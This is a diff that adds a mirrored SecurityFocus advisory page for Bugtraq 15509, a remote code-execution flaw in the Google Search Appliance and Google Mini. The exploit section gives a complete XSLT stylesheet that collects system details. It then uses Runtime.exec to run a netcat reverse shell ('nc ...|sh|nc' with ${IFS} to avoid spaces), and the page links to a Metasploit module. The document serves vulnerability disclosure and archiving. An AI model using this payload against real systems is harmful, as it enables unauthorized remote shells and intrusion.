@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid15509<p><b><span style="font-size: 18pt;">Google Search Appliance ProxyStyleSheet Multiple Remote Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/15509/info">info</a><br><a href="http://www.securityfocus.com/bid/15509/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/15509/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/15509/solution">solution</a><br><a href="http://www.securityfocus.com/bid/15509/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				15509
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Design Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 21 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 03 2006 06:48PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				H D Moore &lt;hdm@metasploit.com&gt; is credited with the discovery of these issues.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Google Search Appliance  0<br/>
+					
+				
+					Google Mini Search Appliance  0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x16000/15509/google_proxystylesheet_exec.pm">#exploit_google_proxystylesheet_exec.pm</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An exploit is not required to leverage these issues. An example style sheet sufficient to execute commands has been provided: <br/> <br/>&lt;xsl:template  <br/> name="my_page_footer" <br/> xmlns:sys="http://www.oracle.com/XSL/Transform/java/java.lang.System" <br/> xmlns:run="http://www.oracle.com/XSL/Transform/java/java.lang.Runtime" <br/>&gt; <br/> <br/>&lt;!-- Google Mini XSLT Code Execution metasploit --&gt; <br/> <br/>XSLT Version: &lt;xsl:value-of select="system-property('xsl:version')"/&gt; &lt;br /&gt; <br/>XSLT Vendor: &lt;xsl:value-of select="system-property('xsl:vendor')" /&gt; &lt;br /&gt; <br/>XSLT URL: &lt;xsl:value-of select="system-property('xsl:vendor-url')" /&gt; &lt;br /&gt; <br/>OS: &lt;xsl:value-of select="sys:getProperty('os.name')" /&gt; &lt;br /&gt; <br/>Version: &lt;xsl:value-of select="sys:getProperty('os.version')" /&gt; &lt;br /&gt; <br/>Arch: &lt;xsl:value-of select="sys:getProperty('os.arch')" /&gt; &lt;br /&gt; <br/>UserName: &lt;xsl:value-of select="sys:getProperty('user.name')" /&gt; &lt;br /&gt; <br/>UserHome: &lt;xsl:value-of select="sys:getProperty('user.home')" /&gt; &lt;br /&gt; <br/>UserDir: &lt;xsl:value-of select="sys:getProperty('user.dir')" /&gt; &lt;br /&gt; <br/> <br/>Executing command...&lt;br /&gt; <br/>&lt;xsl:value-of select="run:exec(run:getRuntime(), 'sh -c nc${IFS}255.255.255.255${IFS}53|sh|nc${IFS}255.255.255.255${IFS}53')" /&gt; <br/>  &lt;/span&gt; <br/>&lt;/xsl:template&gt; <br/> <br/>An exploit for the Metasploit Framework is also available: 
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/google_proxystylesheet_exec.pm">/data/vulnerabilities/exploits/google_proxystylesheet_exec.pm</a></li>
+</ul>
+</div>
